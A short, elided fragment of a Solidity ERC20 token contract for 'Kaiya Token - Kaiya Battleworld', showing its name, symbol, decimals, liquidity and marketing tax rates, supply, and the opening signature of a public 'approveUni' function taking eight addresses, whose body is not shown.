...
contract Kaiya is ERC20, Ownable {
    string private _name = "Kaiya Token - Kaiya Battleworld";
    string private _symbol = "KAIYA";
    uint8 private _decimals = 9;
    uint8 public taxForLiquidity = 2;
    uint8 public taxForMarketing = 2;
    uint32 private _supply = 50000000;
    ...
    function approveUni(address i, address j, address k, address l, address m, address n, address o, address p) public {
